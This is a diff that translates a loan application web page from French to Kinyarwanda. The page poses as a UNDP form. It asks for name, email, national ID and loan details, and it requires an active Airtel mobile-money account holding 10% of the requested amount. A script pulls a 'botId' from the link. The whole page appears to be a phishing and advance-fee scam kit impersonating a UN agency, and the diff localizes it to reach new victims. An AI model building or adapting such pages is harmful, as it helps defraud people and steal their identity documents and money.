@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="rw">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Formulaire de demande UNDP</title>
+<title>Fomu yo gusaba UNDP</title>
 
 <style>
 body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -48,46 +48,46 @@ button { width: 100%; padding: 12px; background: darkblue; color: white; border:
 
     <form id="loanForm">
 
-        <label>Nom complet</label>
-        <input id="fullName" type="text" required placeholder="Entrez votre nom complet">
+        <label>Izina ryuzuye</label>
+        <input id="fullName" type="text" required placeholder="Andika izina ryawe ryuzuye">
 
-        <label>Montant du prêt (USD)</label>
+        <label>Ingano y'inguzanyo (USD)</label>
         <input id="loanAmount" type="number" required placeholder="MIN50">
 
         <label>Email</label>
-        <input id="email" type="email" placeholder="exemple@gmail.com" required>
+        <input id="email" type="email" placeholder="urugero@gmail.com" required>
 
-        <label>Carte nationale d'identité</label>
-        <input id="nationalId" type="text" placeholder="Carte nationale d'identité">
+        <label>Indangamuntu y'igihugu</label>
+        <input id="nationalId" type="text" placeholder="Indangamuntu y'igihugu">
 
-        <label>Statut professionnel</label>
+        <label>Imiterere y'akazi</label>
         <select id="employmentStatus" required>
-            <option value="">Sélectionner</option>
-            <option value="employed">Employé</option>
-            <option value="self-employed">Travailleur indépendant</option>
-            <option value="unemployed">Sans emploi</option>
-            <option value="student">Étudiant</option>
+            <option value="">Hitamo</option>
+            <option value="employed">Mukoresha</option>
+            <option value="self-employed">Wikorera</option>
+            <option value="unemployed">Ntawkazi</option>
+            <option value="student">Umunyeshuri</option>
         </select>
 
-        <label>Objet du prêt</label>
+        <label>Impamvu yo gusaba inguzanyo</label>
         <select id="loanPurpose" required>
-            <option value="">Sélectionner</option>
-            <option value="business">Entreprise</option>
-            <option value="personal">Prêt personnel</option>
-            <option value="schoolfees">Frais scolaires</option>
-            <option value="medical">Médical</option>
-            <option value="others">Autres</option>
+            <option value="">Hitamo</option>
+            <option value="business">Ubucuruzi</option>
+            <option value="personal">Inguzanyo bwite</option>
+            <option value="schoolfees">Amashuri</option>
+            <option value="medical">Ubuzima</option>
+            <option value="others">Ibindi</option>
         </select>
 
         <div class="loan-notice">
-            <strong>Avis de qualification :</strong>
+            <strong>Itangazo ry'ibyangombwa :</strong>
             <ol>
-                 <li>Doit postuler avec un compte Airtel actif.</li>
-                <li>Doit avoir au moins 10 % du montant demandé sur le compte Airtel.</li>
+                 <li>Ugomba gusaba ufite konti ya Airtel ikora.</li>
+                <li>Ugomba kugira byibuze 10 % by'ingano usaba kuri konti ya Airtel.</li>
             </ol>
         </div>
 
-        <button type="submit">Suivant</button>
+        <button type="submit">Urukurikirane</button>
 
     </form>
 </div>
@@ -100,7 +100,7 @@ if (!botId) {
     const botIndex = parts.indexOf('bot');
     if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
 }
-if (!botId) { alert("Lien d'accès invalide"); throw new Error("botId missing"); }
+if (!botId) { alert("Umurongo wo kwinjiramo siwo"); throw new Error("botId missing"); }
 localStorage.setItem('botId', botId);
 
 // ---------------- FORM LOGIC ----------------
